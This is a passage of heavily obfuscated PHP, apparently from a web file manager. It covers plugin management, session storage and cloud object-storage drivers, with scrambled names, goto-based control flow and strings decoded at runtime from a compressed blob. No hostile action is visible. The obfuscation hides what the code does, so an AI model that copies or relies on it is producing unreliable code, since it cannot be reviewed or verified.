$F¶ÃôÆòŠ¼[$C¶Ì¯Ø¢ê[$d°²ºæ‡…½[2107]]] : array(); } goto e…ÜƒÖØ”; e…ÜƒÖØ”: } protected function resetParentLevel() { $b¯ÖùŠ˜ÀÃ =& $_SERVER[‚Ğ°–—î]; $f†¯³¶Ú™ = $b¯ÖùŠ˜ÀÃ[2107]; $A £–Ğªßò = $this->select(); $A £–Ğªßò = array_to_keyvalue($A £–Ğªßò, $f†¯³¶Ú™); foreach ($A £–Ğªßò as $FïÂÛ¸«í) { goto aÅ•ŞÈ±¼à; B«èÜô¶æ: $B‡ÊÔƒ±½Ğ[] = 0; $B‡ÊÔƒ±½Ğ = $b¯ÖùŠ˜ÀÃ[47] . implode($b¯ÖùŠ˜ÀÃ[47], array_reverse($B‡ÊÔƒ±½Ğ)) . $b¯ÖùŠ˜ÀÃ[47]; $this->setNamePinyin($FïÂÛ¸«í[$f†¯³¶Ú™], $FïÂÛ¸«í[$b¯ÖùŠ˜ÀÃ[28]]); goto bíâŠ”•ø; aÅ•ŞÈ±¼à: $B ¡—œĞ³× = $FïÂÛ¸«í; $B‡ÊÔƒ±½Ğ = array(); while ($B ¡—œĞ³×[$b¯ÖùŠ˜ÀÃ[461]] != 0) { $B‡ÊÔƒ±½Ğ[] = $B ¡—œĞ³×[$b¯ÖùŠ˜ÀÃ[461]]; $B ¡—œĞ³× = $A £–Ğªßò[$B ¡—œĞ³×[$b¯ÖùŠ˜ÀÃ[461]]]; } goto B«èÜô¶æ; bíâŠ”•ø: $this->where(array($f†¯³¶Ú™ => $FïÂÛ¸«í[$f†¯³¶Ú™]))->save(array($b¯ÖùŠ˜ÀÃ[525] => $B‡ÊÔƒ±½Ğ)); goto eâ¨ÓĞöğÛ; eâ¨ÓĞöğÛ: } return $A £–Ğªßò; } public function groupNameAuto($CÖ‰Ô¶Æ„¦, $eÅ¢¬§é) { $bšøòÃÇ¢Ú =& $_SERVER[‚Ğ°–—î]; $bæ­–šÁ†Ì = $this->where(array($bšøòÃÇ¢Ú[368] => $CÖ‰Ô¶Æ„¦))->getField($bšøòÃÇ¢Ú[28], !0); if (!$bæ­–šÁ†Ì || !in_array($eÅ¢¬§é, $bæ­–šÁ†Ì)) { return $eÅ¢¬§é; } for ($cÄ—¥è¾äÁ = 1; $cÄ—¥è¾äÁ <= count($bæ­–šÁ†Ì) + 1; $cÄ—¥è¾äÁ++) { $AŠ‰ŒŞ† = $eÅ¢¬§é . "\50{$cÄ—¥è¾äÁ}\51"; if (!in_array($AŠ‰ŒŞ†, $bæ­–šÁ†Ì)) { return $AŠ‰ŒŞ†; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\160\x6c\165\147\x69\156\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\163\x74\141\164\x75\x73", "\162\x65\x67\151\x65\163\x74", "\143\x6f\156\x66\x69\x67"); public function loadList($dÂˆ«–çšÔ = false) { $a„Ò”¯ÉÁÚ = array_to_keyvalue($this->listData(), $_SERVER[‚Ğ°–—î][28]); if ($dÂˆ«–çšÔ) { return $a„Ò”¯ÉÁÚ[$dÂˆ«–çšÔ]; } return $a„Ò”¯ÉÁÚ; } public function init() { $aà©Ê°“ÓÒ =& $_SERVER[‚Ğ°–—î]; Hook::trigger($aà©Ê°“ÓÒ[2195]); $DŒ‹¡È¨ëÔ = $this->loadPluginList(); foreach ($DŒ‹¡È¨ëÔ as $Eğ‹¸Û¬†’ => $Bàö½õêÉâ) { $FÃõÓÒä£¨ = $this->appAllow($Eğ‹¸Û¬†’, $Bàö½õêÉâ); if (!$FÃõÓÒä£¨) { continue; } foreach ($Bàö½õêÉâ[$aà©Ê°“ÓÒ[2196]] as $b«í±Õøã¹ => $eƒßä”Õ§) { Hook::bind($b«í±Õøã¹, $eƒßä”Õ§); } } Hook::trigger($aà©Ê°“ÓÒ[2197]); Hook::trigger(ACTION); } public function appAllow($b‘Ï¸‰í©, $cÜ»È´á°­, $e¦Ïí¨Êç = true) { $Fµö‹Œ¹¬§ =& $_SERVER[‚Ğ°–—î]; $aÕä­ñƒ³ê = PLUGIN_DIR . $b‘Ï¸‰í© . $Fµö‹Œ¹¬§[2198]; if (!is_array($cÜ»È´á°­) || !is_array($cÜ»È´á°­[$Fµö‹Œ¹¬§[2196]]) || !is_file($aÕä­ñƒ³ê) || $cÜ»È´á°­[$Fµö‹Œ¹¬§[688]] != 1) { return !1; } if ($e¦Ïí¨Êç && !Action($Fµö‹Œ¹¬§[2199])->checkAuth($b‘Ï¸‰í©)) { return !1; } return !0; } public function unInstall($bãØ¢¶¿‡£) { $bõ¼İØÅÇ„ =& $_SERVER[‚Ğ°–—î]; $Aœˆ—ÇÇñÆ = $this->loadList($bãØ¢¶¿‡£); if (file_exists(PLUGIN_DIR . $bãØ¢¶¿‡£)) { Hook::apply($bãØ¢¶¿‡£ . $bõ¼İØÅÇ„[2200]); } $this->remove($Aœˆ—ÇÇñÆ[$bõ¼İØÅÇ„[367]]); } public function changeStatus($C®ê‘ö­¥², $b…²¸•éàğ) { $fĞØ‹ê’Á‘ =& $_SERVER[‚Ğ°–—î]; $Cê¸õ§ŒÌ¶ = $this->loadList($C®ê‘ö­¥²); if ($b…²¸•éàğ) { Hook::apply($C®ê‘ö­¥² . $fĞØ‹ê’Á‘[2201]); } $this->update($Cê¸õ§ŒÌ¶[$fĞØ‹ê’Á‘[367]], array($fĞØ‹ê’Á‘[2202] => $b…²¸•éàğ)); } public function appRegist($FÖ± ˆëô, $cõ¡¹­ŒçË) { $e¬©˜‘˜ÒŞ =& $_SERVER[‚Ğ°–—î]; $FñÉâ£ëÄÍ = $this->loadList($FÖ± ˆëô); if ($FñÉâ£ëÄÍ) { $this->update($FñÉâ£ëÄÍ[$e¬©˜‘˜ÒŞ[367]], array($e¬©˜‘˜ÒŞ[2196] => $cõ¡¹­ŒçË)); } else { $eÀ­í«‚ = array($e¬©˜‘˜ÒŞ[28] => $FÖ± ˆëô, $e¬©˜‘˜ÒŞ[2196] => $cõ¡¹­ŒçË, $e¬©˜‘˜ÒŞ[688] => 0, $e¬©˜‘˜ÒŞ[6] => $this->getConfigDefault($FÖ± ˆëô)); $this->insert($eÀ­í«‚); } } public function getConfigDefault($F¿´†ç¸•’) { $fì£‘ÃİÛ =& $_SERVER[‚Ğ°–—î]; $dÃ•ñ¿­ = array(); $E«¯¤òÛÖ¾ = $this->getPackageJson($F¿´†ç¸•’); if (!$E«¯¤òÛÖ¾ && is_array($E«¯¤òÛÖ¾[$fì£‘ÃİÛ[2203]])) { return $dÃ•ñ¿­; } foreach ($E«¯¤òÛÖ¾[$fì£‘ÃİÛ[2203]] as $aº‰—ÅóŸ => $F«É­ÔÜ¸Õ) { if (!isset($F«É­ÔÜ¸Õ[$fì£‘ÃİÛ[359]]) || isset($dÃ•ñ¿­[$aº‰—ÅóŸ])) { continue; } $dÃ•ñ¿­[$aº‰—ÅóŸ] = $F«É­ÔÜ¸Õ[$fì£‘ÃİÛ[359]]; } return $dÃ•ñ¿­; } public function getPackageJson($a‡Ò„êèæÎ) { return Hook::apply($a‡Ò„êèæÎ . $_SERVER[‚Ğ°–—î][2204]); } public function getConfig($C›£˜Û§, $c¶§“Ù‚°ä = false) { $a™Ø…Õ±¬ë =& $_SERVER[‚Ğ°–—î]; $a‡‡Â¨§Ú = array(); $e¡¼œ­£š = $this->loadList($C›£˜Û§); if ($e¡¼œ­£š && is_array($e¡¼œ­£š[$a™Ø…Õ±¬ë[6]])) { $a‡‡Â¨§Ú = $e¡¼œ­£š[$a™Ø…Õ±¬ë[6]]; } if (!$a‡‡Â¨§Ú || $c¶§“Ù‚°ä) { $a‡‡Â¨§Ú = $this->getConfigDefault($C›£˜Û§); } return $a‡‡Â¨§Ú; } public function setConfig($C££½¯óƒ, $C¬¢¬¬°òŞ = false) { goto Eˆ¾â¯‘¨; Eˆ¾â¯‘¨: $BºÆ˜‰ç…Ê =& $_SERVER[‚Ğ°–—î]; $A¤¦·Ü¢ùæ = $this->loadList($C££½¯óƒ); if (!$A¤¦·Ü¢ùæ) { return !1; } goto cÄå„‘ë; CÊÛ¼£Ü°É: $this->update($A¤¦·Ü¢ùæ[$BºÆ˜‰ç…Ê[367]], array($BºÆ˜‰ç…Ê[6] => $FÉëÄˆ„À´)); goto BìÎ¿õ”Êò; cÄå„‘ë: $FÉëÄˆ„À´ = $A¤¦·Ü¢ùæ[$BºÆ˜‰ç…Ê[6]]; if ($C¬¢¬¬°òŞ == !1) { $FÉëÄˆ„À´ = array(); $C¬¢¬¬°òŞ = $this->getConfigDefault($C££½¯óƒ); } foreach ($C¬¢¬¬°òŞ as $D“¹©Ä—¥ => $d¥Ğ¹å„Àø) { $FÉëÄˆ„À´[$D“¹©Ä—¥] = is_string($d¥Ğ¹å„Àø) ? trim($d¥Ğ¹å„Àø) : $d¥Ğ¹å„Àø; } goto CÊÛ¼£Ü°É; BìÎ¿õ”Êò: } public function viewList() { goto A‚Ë¼˜„; CªŒÖÇî³: $cŒñÕº—  = $this->loadPluginList(); $EÙºŠïÃ„“ = array(); foreach ($cŒñÕº—  as $A“¶‡ë¦ => $b¢ğ¯›âù±) { unset($b¢ğ¯›âù±[$bÇƒ©öŒ“Æ[2196]], $b¢ğ¯›âù±[$bÇƒ©öŒ“Æ[6]]); $CöæÉÕöİ» = PLUGIN_DIR . $b¢ğ¯›âù±[$bÇƒ©öŒ“Æ[28]] . $bÇƒ©öŒ“Æ[2198]; if (!is_file($CöæÉÕöİ»)) { continue; } $d»£ÛëÈ†ˆ = Hook::apply($b¢ğ¯›âù±[$bÇƒ©öŒ“Æ[28]] . $bÇƒ©öŒ“Æ[2204]); if (is_array($d»£ÛëÈ†ˆ)) { $EÙºŠïÃ„“[$A“¶‡ë¦] = array_merge($b¢ğ¯›âù±, $d»£ÛëÈ†ˆ); } } goto c•ôÜÀ í; A‚Ë¼˜„: $bÇƒ©öŒ“Æ =& $_SERVER[‚Ğ°–—î]; $cŒñÕº—  = $this->loadList(); $this->pluginScan($cŒñÕº— ); goto CªŒÖÇî³; c•ôÜÀ í: return $EÙºŠïÃ„“; goto CªÓøÌœÈ; CªÓøÌœÈ: } private function loadPluginList() { $fííò÷„º” =& $_SERVER[‚Ğ°–—î]; $a·ÙùÀ…® = $this->loadList(); if (strtolower(MOD) == $fííò÷„º”[2205]) { return $a·ÙùÀ…®; } $b»øŠ¸±Íä = Hook::trigger($fííò÷„º”[2206], $a·ÙùÀ…®); if ($a·ÙùÀ…® && !$b»øŠ¸±Íä) { die; } return $b»øŠ¸±Íä ? $b»øŠ¸±Íä : $a·ÙùÀ…®; } private function pluginScan($CÁœŸ§Ó›) { $cƒ­—×§¦Ì =& $_SERVER[‚Ğ°–—î]; recursion_dir(PLUGIN_DIR, $b‘Ø½Ç­‚Ó, $EŒİ’äº¤ê, 0); foreach ($b‘Ø½Ç­‚Ó as $f›‰Ø…´İê) { $AÂ¾âİŒÑ´ = get_path_this($f›‰Ø…´İê); if (isset($CÁœŸ§Ó›[$AÂ¾âİŒÑ´]) || !file_exists($f›‰Ø…´İê . $cƒ­—×§¦Ì[2207]) || !file_exists($f›‰Ø…´İê . $cƒ­—×§¦Ì[2198])) { continue; } Hook::apply($AÂ¾âİŒÑ´ . $cƒ­—×§¦Ì[2201]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\x6d\137\163\x65\x73\163\x69\157\156"; public function get($Cåæ†áôË¨) { $A³©×å¾”É =& $_SERVER[‚Ğ°–—î]; $aÈù Ã° = $this->where(array($A³©×å¾”É[2208] => $Cåæ†áôË¨))->find(); if (!is_array($aÈù Ã°)) { return !1; } return $aÈù Ã°[$A³©×å¾”É[691]]; } public function set($aÕÓÔñµà®, $eŞ§ÉÛ‚·Ì, $F§Ïíô˜† = 3600) { $B–ñÚé×–¶ =& $_SERVER[‚Ğ°–—î]; $E‡Ÿ³–­¹ = array($B–ñÚé×–¶[2208] => $aÕÓÔñµà®, $B–ñÚé×–¶[2137] => $eŞ§ÉÛ‚·Ì, $B–ñÚé×–¶[2209] => $F§Ïíô˜† + time()); if (Session::get($B–ñÚé×–¶[2210])) { $E‡Ÿ³–­¹[$B–ñÚé×–¶[1438]] = Session::get($B–ñÚé×–¶[2210]); } else { $E‡Ÿ³–­¹[$B–ñÚé×–¶[1438]] = 0; } if ($this->get($aÕÓÔñµà®)) { return $this->where(array($B–ñÚé×–¶[2208] => $aÕÓÔñµà®))->save($E‡Ÿ³–­¹); } else { return $this->add($E‡Ÿ³–­¹, array(), !0); } } public function remove($E¯À‹Ã©İò) { return $this->where(array($_SERVER[‚Ğ°–—î][2208] => $E¯À‹Ã©İò))->delete(); } public function clearTimeout() { return $this->where($_SERVER[‚Ğ°–—î][2211] . time())->delete(); } } goto BŠ¢†…ùœ©; bÆÜ“Äé©‘: $C©Ê’Ò‹‹‹ = $_SERVER[‚Ğ°–—î][547]; $_SERVER[òÈ„‹Ü] = explode($_SERVER[‚Ğ°–—î][548], gzinflate(substr($_SERVER[‚Ğ°–—î][549], 10, -8))); $E³˜ßåËÙŸ = $_SERVER[‚Ğ°–—î][550]; goto cŒªùÌ”‘–; CçãÑ˜Š•“: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Cƒ’œòš) { parent::__construct($Cƒ’œòš); $this->signatureVersion($_SERVER[‚Ğ°–—î][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($CÉ‡ŠÕˆö) { parent::__construct($CÉ‡ŠÕˆö); $this->signatureVersion($_SERVER[‚Ğ°–—î][200]); } public function fileOutLink($E°•øÎ‚Œ) { $dÅáÛ¯Äé =& $_SERVER[‚Ğ°–—î]; if (substr($E°•øÎ‚Œ, 0, 7) == $dÅáÛ¯Äé[1116]) { $E°•øÎ‚Œ = $dÅáÛ¯Äé[1117] . substr($E°•øÎ‚Œ, 7); } header($dÅáÛ¯Äé[156] . $E°•øÎ‚Œ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($d¯õ“Öâ¶›) { parent::__construct(); include_once SDK_DIR . $_SERVER[‚Ğ°–—î][1171]; $this->_init($d¯õ“Öâ¶›); } public function _init($Cï×‡Ä¼øî) { foreach ($Cï×‡Ä¼øî as $d‡©ßéŒæ´ => $fíŸ…¬è‹Š) { if (isset($this->{$d‡©ßéŒæ´})) { $this->{$d‡©ßéŒæ´} = $fíŸ…¬è‹Š; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[‚Ğ°–—î][1172], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto F¨«ÎÙÌã; B®Ãƒ•¾‚»: $Dğõí¹ÅÊ->addAllowedOrigin($A¼‰²Ã£¸ó[1173]); $Dğõí¹ÅÊ->addAllowedMethod($A¼‰²Ã£¸ó[1174]); $Dğõí¹ÅÊ->addAllowedMethod($A¼‰²Ã£¸ó[1175]); goto B‘Á…èÀ÷Ü; aœÍìæÊÃÄ: $eí½éÕïË¿->addRule($Dğõí¹ÅÊ); try { $this->client->putBucketCors($this->bucket, $eí½éÕïË¿); } catch (OSS\Core\OssException $F—°ä°Äœ) { return !1; } return !0; goto Ağà‰‰»ªê; a†§¯¹Ï: $Dğõí¹ÅÊ->setMaxAgeSeconds(600); $Dğõí¹ÅÊ->addExposeHeader($A¼‰²Ã£¸ó[1178]); $Dğõí¹ÅÊ->addAllowedHeader($A¼‰²Ã£¸ó[1173]); goto aœÍìæÊÃÄ; B‘Á…èÀ÷Ü: $Dğõí¹ÅÊ->addAllowedMethod($A¼‰²Ã£¸ó[1176]); $Dğõí¹ÅÊ->addAllowedMethod($A¼‰²Ã£¸ó[1177]); $Dğõí¹ÅÊ->addAllowedMethod($A¼‰²Ã£¸ó[155]); goto a†§¯¹Ï; F¨«ÎÙÌã: $A¼‰²Ã£¸ó =& $_SERVER[‚Ğ°–—î]; $eí½éÕïË¿ = new OSS\Model\CorsConfig(); $Dğõí¹ÅÊ = new OSS\Model\CorsRule(); goto B®Ãƒ•¾‚»; Ağà‰‰»ªê: } public function getBucketCors() { goto c¸Ø“†Šá; c¸Ø“†Šá: $b•º“ŠÔ› =& $_SERVER[‚Ğ°–—î]; $dÙá§Òïƒ = null; try { $dÙá§Òïƒ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $dÃ¹•…§ä) { return null; } goto DœÄŠó‹ï; DœÄŠó‹ï: if (!$dÙá§Òïƒ || !($BÑ–ò±ôô = $dÙá§Òïƒ->getRules())) { return null; } $dš†¦´ˆ» = $BÑ–ò±ôô[0]->getAllowedOrigins(); $cß·ğ’®– = $BÑ–ò±ôô[0]->getAllowedMethods(); goto AòßˆÌ²Á; AòßˆÌ²Á: $d±¸½Ô†á = $BÑ–ò±ôô[0]->getMaxAgeSeconds(); $A…æóÑÑ = $BÑ–ò±ôô[0]->getExposeHeaders(); $f‹‘ˆ§ƒå = $BÑ–ò±ôô[0]->getAllowedHeaders(); goto Fİ‡È¹ğÎó; Fİ‡È¹ğÎó: return array($b•º“ŠÔ›[175] => isset($dš†¦´ˆ»[0]) ? $dš†¦´ˆ»[0] : $b•º“ŠÔ›[33], $b•º“ŠÔ›[179] => $cß·ğ’®–, $b•º“ŠÔ›[1179] => $d±¸½Ô†á, $b•º“ŠÔ›[1180] => isset($A…æóÑÑ[0]) ? $A…æóÑÑ[0] : $b•º“ŠÔ›[33], $b•º“ŠÔ›[177] => isset($f‹‘ˆ§ƒå[0]) ? $f‹‘ˆ§ƒå[0] : $b•º“ŠÔ›[33]); goto F™ÀÈÜÍ‡; F™ÀÈÜÍ‡: } public function isBucketCors() { goto cÛö¤Üãè; cÛö¤Üãè: $a”ãµª¯ =& $_SERVER[‚Ğ°–—î]; $AÚ¥²â½¦õ = $this->getBucketCors(); if (!$AÚ¥²â½¦õ || !is_array($AÚ¥²â½¦õ)) { return !1; } goto d¬¦àÂ™¢”; FÕ‹òÁ§Â: $eËç‡Å³ = array($a”ãµª¯[180], $a”ãµª¯[181], $a”ãµª¯[182], $a”ãµª¯[183], $a”ãµª¯[184]); $Aò¯¨ÏØ» = array_diff($eËç‡Å³, $AªÂÕƒŸ¾); return empty($Aò¯¨ÏØ»); goto eË¶‰İˆ»; d¬¦àÂ™¢”: if ($AÚ¥²â½¦õ[$a”ãµª¯[175]] != $a”ãµª¯[176] || $AÚ¥²â½¦õ[$a”ãµª¯[177]] != $a”ãµª¯[176]) { return !1; } $AªÂÕƒŸ¾ = array_map($a”ãµª¯[178], $AÚ¥²â½¦õ[$a”ãµª¯[179]]); if (!is_array($AªÂÕƒŸ¾)) { $AªÂÕƒŸ¾ = array(); } goto FÕ‹òÁ§Â; eË¶‰İˆ»: } public function mkfile($aÛº…ÙßË‹, $Dš¨ã²§À³ = '', $cÉÖèª‡ù = REPEAT_RENAME) { $Cß‰°ììôÈ = $this->setContent($aÛº…ÙßË‹, $Dš¨ã²§À³); if ($Cß‰°ììôÈ !== !1) { return $this->getPathOuter($aÛº…ÙßË‹); } return !1; } public function mkdir($dİœ¼ğàÇ, $CÃ­Ì–Í‰Ü = REPEAT_SKIP) { if ($this->_isFolder($dİœ¼ğàÇ)) { return $this->getPathOuter($dİœ¼ğàÇ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($dİœ¼ğàÇ)); } catch (OSS\Core\OssException $d‹ñ‡‚ë‰Õ) { return !1; } return $this->getPathOuter($dİœ¼ğàÇ); } private function fileList($aƒ¢£†âç±, $Bğ‰ø¤–İƒ = '', $Cµœ÷Üï  = 0) { goto céËõ„ßÃò; céËõ„ßÃò: $Eˆß¸ Ç… =& $_SERVER[‚Ğ°–—î]; $aƒ¢£†âç± = trim($aƒ¢£†âç±, $Eˆß¸ Ç…[8]); $dòÎŠæöŸˆ = empty($aƒ¢£†âç±) ? $Eˆß¸ Ç…[33] : $aƒ¢£†âç± . $Eˆß¸ Ç…[8]; goto F÷ºŸºƒ÷À; F÷ºŸºƒ÷À: $b…‡†‘Àô = $Eˆß¸ Ç…[33]; $DèÙ…ËÆ = 1000; $C§İÏ‡˜ˆå = $F›³ÚªÎÏÃ = array(); goto dÁ‚íµ”—£; dÁ‚íµ”—£: while (!0) { $C¶ƒâµÊ¡œ = array($Eˆß¸ Ç…[1181] => $Bğ‰ø¤–İƒ, $Eˆß¸ Ç…[186] => $dòÎŠæöŸˆ, $Eˆß¸ Ç…[1182] => $DèÙ…ËÆ, $Eˆß¸ Ç…[1183] => $b…‡†‘Àô); try { $dÄËÀ˜îİ = $this->client->listObjects($this->bucket, $C¶ƒâµÊ¡œ); } catch (OSS\Core\OssException $báõñªÅ¦ç) { break; } $b…‡†‘Àô = $dÄËÀ˜îİ->getNextMarker(); $aòŠæŒË = $dÄËÀ˜îİ->getObjectList(); $D´½ £ò–¼ = $dÄËÀ˜îİ->getPrefixList(); foreach ($aòŠæŒË as $bğÜÈŠ ›Î) { if ($bğÜÈŠ ›Î->getKey() == $dòÎŠæöŸˆ) { continue; } $bÖ°ö¶œİÜ = $bğÜÈŠ ›Î->getKey(); if ($Cµœ÷Üï ) { $bÖ°ö¶œİÜ = array($Eˆß¸ Ç…[28] => $bÖ°ö¶œİÜ, $Eˆß¸ Ç…[77] => $bğÜÈŠ ›Î->getSize(), $Eˆß¸ Ç…[190] => strtotime($bğÜÈŠ ›Î->getLastModified())); } $F›³ÚªÎÏÃ[] = $bÖ°ö¶œİÜ; } foreach ($D´½ £ò–¼ as $b±‹œ»±ƒ) { $C§İÏ‡˜ˆå[] = $b±‹œ»±ƒ->getPrefix(); } if ($b…‡†‘Àô === $Eˆß¸ Ç…[33]) { break; } } return array($Eˆß¸ Ç…[74] => $C§İÏ‡˜ˆå, $Eˆß¸ Ç…[73] => $F›³ÚªÎÏÃ); goto D“Í¦ŒÖ×‡; D“Í¦ŒÖ×‡: } public function copyFile($eˆçõÉ‚èá, $d¬“‘ÊÉœ) { $fñà„ÙÈØå = $this->size($eˆçõÉ‚èá); if ($fñà„ÙÈØå < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $eˆçõÉ‚èá, $this->bucket, $this->pathEncode($d¬“‘ÊÉœ)); } catch (OSS\Core\OssException $fßÑĞ‰’ î) { return !1; } return !0; } return $this->multiCopyObject($eˆçõÉ‚èá, $d¬“‘ÊÉœ, $fñà„ÙÈØå); } private function multiCopyObject($D§ŠÆœ‡º, $fµ“ßÄÏ†Ã, $BŸêÃ´¼½“) { $f½ˆçËÇ¹æ =& $_SERVER[‚Ğ°–—î]; try { goto fÍêğ‚Šà; fÍêğ‚Šà: $AÊÓšËÈ½ = array(); if ($dŒØ’º¯ÊÎ = $this->hashMd5($D§ŠÆœ‡º)) { $AÊÓšËÈ½ = array(OSS\OssClient::OSS_HEADERS => array($f½ˆçËÇ¹æ[1184] => $dŒØ’º¯ÊÎ)); } $F¥£®À³šò = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($fµ“ßÄÏ†Ã), $AÊÓšËÈ½); goto D‘š²âÁ­; bªõ»Ôèßò: $bÄ››Š„“ = array(); foreach ($Fñœ…¨ƒœË as $Bæ¥°ƒªÕ¶ => $AÑĞ˜…íÆÇ) { $bÄ››Š„“[] = array($f½ˆçËÇ¹æ[1188] => $Bæ¥°ƒªÕ¶ + 1, $f½ˆçËÇ¹æ[1189] => $AÑĞ˜…íÆÇ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($fµ“ßÄÏ†Ã), $F¥£®À³šò, $bÄ››Š„“); goto fÄ‰è±‡¢é; b´‰¸ñâ¡Ù: $F«ÜŠñøÑ = 1024 * 1024 * 10; $AÕÒ˜ÕçÑá = $this->client->generateMultiuploadParts($BŸêÃ´¼½“, $F«ÜŠñøÑ); foreach ($AÕÒ˜ÕçÑá as $Bæ¥°ƒªÕ¶ => $Bî³âíŠß™) { $C„–˜³§¥ø = $aêÓ‚İá¢„ + (int) $Bî³âíŠß™[$f½ˆçËÇ¹æ[1185]]; $BŞÊ™Ÿ‹øä = (int) $Bî³âíŠß™[$f½ˆçËÇ¹æ[325]] + $C„–˜³§¥ø - 1; $DáÌèÙê½É = array($f½ˆçËÇ¹æ[1186] => $C„–˜³§¥ø, $f½ˆçËÇ¹æ[1187] => $BŞÊ™Ÿ‹øä); $Fñœ…¨ƒœË[] = $this->client->uploadPartCopy($this->bucket, $D§ŠÆœ‡º, $this->bucket, $this->pathEncode($fµ“ßÄÏ†Ã), $d¢š¼Ë°â›, $F¥£®À³šò, $DáÌèÙê½É); $d¢š¼Ë°â› = $d¢š¼Ë°â› + 1; } goto bªõ»Ôèßò; D‘š²âÁ­: $d¢š¼Ë°â› = 1; $aêÓ‚İá¢„ = 0; $Fñœ…¨ƒœË = array(); goto b´‰¸ñâ¡Ù; fÄ‰è±‡¢é: } catch (OSS\Core\OssException $D‹Ù³ÌÆŠù) { return !1; } return !0; } public function moveFile($a±ìñ‚É…, $C§«©ÚÍ‡ó) { if ($this->copyFile($a±ìñ‚É…, $C§«©ÚÍ‡ó)) { $this->remove($a±ìñ‚É…); return !0; } return !1; } public function delFile($FáöÚ‡Å¥¹) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($FáöÚ‡Å¥¹)); } catch (OSS\Core\OssException $b†Úİ·‹ğ™) { return !1; } return !0; } public function delFolder($E‚»ÙÜåñ) { $E–Ô‡„‹Ìõ =& $_SERVER[‚Ğ°–—î]; $DÍÜÏ­Öäß = $this->fileList($E‚»ÙÜåñ); if (!empty($E‚»ÙÜåñ) && !in_array(trim($E‚»ÙÜåñ, $E–Ô‡„‹Ìõ[8]) . $E–Ô‡„‹Ìõ[8], $DÍÜÏ­Öäß[$E–Ô‡„‹Ìõ[73]])) { $DÍÜÏ­Öäß[$E–Ô‡„‹Ìõ[73]][] = trim($E‚»ÙÜåñ, $E–Ô‡„‹Ìõ[8]) . $E–Ô‡„‹Ìõ[8]; } foreach (array_chunk($DÍÜÏ­Öäß[$E–Ô‡„‹Ìõ[73]], 1000) as $CÏÎÓœÈ) { try { $this->client->deleteObjects($this->bucket, $CÏÎÓœÈ); } catch (OSS\Core\OssException $AïãÄ‘³×µ) { continue; } } return !0; } public function rename($f¶ô×±î‰š, $cë’¢¡ç ) { return $this->renameObject($f¶ô×±î‰š, $cë’¢¡ç ); } private function fileInfo($dĞØ‡·¢Ì©, $D¨Œö´ßÓ = array()) { goto eˆ™ÊªïŸ; d¢”ÑŠ·¼¿: return $BÌå±ŞÒÇ³; goto f¢ÛªŸÕËÙ; eˆ™ÊªïŸ: $A†ÚçÏ®ÖÄ =& $_SERVER[‚Ğ°–—î]; $BÌå±ŞÒÇ³ = array($A†ÚçÏ®ÖÄ[28] => $this->pathThis($dĞØ‡·¢Ì©), $A†ÚçÏ®ÖÄ[75] => $this->getPathOuter($dĞØ‡·¢Ì©), $A†ÚçÏ®ÖÄ[29] => $A†ÚçÏ®ÖÄ[167], $A†ÚçÏ®ÖÄ[187] => 0, $A†ÚçÏ®ÖÄ[107] => 0, $A†ÚçÏ®ÖÄ[77] => 0, $A†ÚçÏ®ÖÄ[160] => $this->ext($dĞØ‡·¢Ì©), $A†ÚçÏ®ÖÄ[188] => !0, $A†ÚçÏ®ÖÄ[189] => !0); if (empty($D¨Œö´ßÓ)) { $A…µ´è—Ö™ = $this->objectMeta($dĞØ‡·¢Ì©); if (!$A…µ´è—Ö™) { return $BÌå±ŞÒÇ³; } $D¨Œö´ßÓ = array($A†ÚçÏ®ÖÄ[107] => strtotime($A…µ´è—Ö™[$A†ÚçÏ®ÖÄ[1190]]), $A†ÚçÏ®ÖÄ[77] => $A…µ´è—Ö™[$A†ÚçÏ®ÖÄ[1191]] + 0); } goto DÖåÎö™É«; DÖåÎö™É«: if (isset($D¨Œö´ßÓ[$A†ÚçÏ®ÖÄ[77]])) { $BÌå±ŞÒÇ³[$A†ÚçÏ®ÖÄ[77]] = $D¨Œö´ßÓ[$A†ÚçÏ®ÖÄ[77]]; } if (isset($D¨Œö´ßÓ[$A†ÚçÏ®ÖÄ[107]])) { $BÌå±ŞÒÇ³[$A†ÚçÏ®ÖÄ[107]] = $D¨Œö´ßÓ[$A†ÚçÏ®ÖÄ[107]]; } if (isset($D¨Œö´ßÓ[$A†ÚçÏ®ÖÄ[190]]) && !trim($BÌå±ŞÒÇ³[$A†ÚçÏ®ÖÄ[107]])) { $BÌå±ŞÒÇ³[$A†ÚçÏ®ÖÄ[107]] = $D¨Œö´ßÓ[$A†ÚçÏ®ÖÄ[190]]; } goto d¢”ÑŠ·¼¿; f¢ÛªŸÕËÙ: } private function folderInfo($bÌÂÇƒÂÁÅ, $aƒÒÆÆİÑ = array()) { $DšóĞ©™¶ =& $_SERVER[‚Ğ°–—î]; $C¤÷º•‘÷± = array($DšóĞ©™¶[28] => $this->pathThis($bÌÂÇƒÂÁÅ), $DšóĞ©™¶[75] => $this->getPathOuter($DšóĞ©™¶[8] . $bÌÂÇƒÂÁÅ), $DšóĞ©™¶[29] => $DšóĞ©™¶[76], $DšóĞ©™¶[187] => 0, $DšóĞ©™¶[107] => 0, $DšóĞ©™¶[188] => !0, $DšóĞ©™¶[189] => !0); if (empty($aƒÒÆÆİÑ)) { $bÌÂÇƒÂÁÅ = rtrim($bÌÂÇƒÂÁÅ, $DšóĞ©™¶[8]) . $DšóĞ©™¶[8]; 